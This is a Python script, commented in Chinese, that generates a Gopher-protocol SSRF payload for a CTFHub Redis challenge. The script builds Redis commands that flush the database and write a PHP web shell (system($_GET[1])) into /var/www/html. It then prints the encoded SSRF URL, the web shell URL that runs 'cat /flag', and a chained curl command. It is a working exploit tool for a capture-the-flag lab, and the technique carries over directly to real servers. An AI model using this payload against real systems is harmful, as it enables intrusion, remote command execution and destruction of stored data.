#!/usr/bin/env python3
"""
生成 CTFHub Redis SSRF 的 Gopher Payload (修正版)
解决 gopher 协议自动追加 \r\n 导致 Redis 协议解析失败的问题
"""

import urllib.parse

def redis_cmd(*parts):
    """构造 Redis 协议格式的命令"""
    cmd = f"*{len(parts)}\r\n"
    for p in parts:
        cmd += f"${len(p)}\r\n{p}\r\n"
    return cmd

def generate_payload(web_dir="/var/www/html", filename="shell.php", php_cmd="system($_GET[1]);"):
    content = f'\n\n<?php {php_cmd}?>\n\n\n'

    # 构造 Redis 命令序列
    payload = ""
    payload += redis_cmd("flushall")
    payload += redis_cmd("set", "1", content)
    payload += redis_cmd("config", "set", "dir", web_dir)
    payload += redis_cmd("config", "set", "dbfilename", filename)
    payload += redis_cmd("save")

    # 关键修复：去掉末尾的 \r\n
    # 因为 gopher 协议会在 selector 后面自动追加 \r\n
    # 如果 payload 末尾也有 \r\n，Redis 就会收到多余的空行，导致协议错误
    payload = payload[:-2]

    # URL 编码
    encoded = urllib.parse.quote_plus(payload)

    # 原始 gopher URL
    raw = f"gopher://127.0.0.1:6379/_{encoded}"

    # 二次编码，用于通过 ?url= 参数传递
    double = raw.replace('%', '%25')

    target_base = "http://challenge-4d4e35816cfa41c3.sandbox.ctfhub.com:10800"
    webshell_url = f"{target_base}/{filename}?1=cat%20/flag"

    return raw, double, webshell_url

if __name__ == "__main__":
    print("=" * 60)
    print("CTFHub Redis SSRF Payload 生成器 v2 (修正版)")
    print("=" * 60)

    raw, encoded, shell_url = generate_payload()

    print(f"\n[1] 原始 Gopher URL:")
    print(f"{raw}")

    print(f"\n[2] 二次编码 URL (?url= 用):")
    target = "http://challenge-4d4e35816cfa41c3.sandbox.ctfhub.com:10800"
    full_url = f"{target}/?url={encoded}"
    print(f"{full_url}")

    print(f"\n[3] Webshell 地址:")
    print(f"{shell_url}")

    print(f"\n[4] 一条龙 curl:")
    print(f"curl -s -m 8 \"{full_url}\" && curl -s \"{shell_url}\"")

    print("\n" + "=" * 60)
    print("提示: -m 8 表示最多等8秒，避免504超时卡住")
    print("=" * 60)
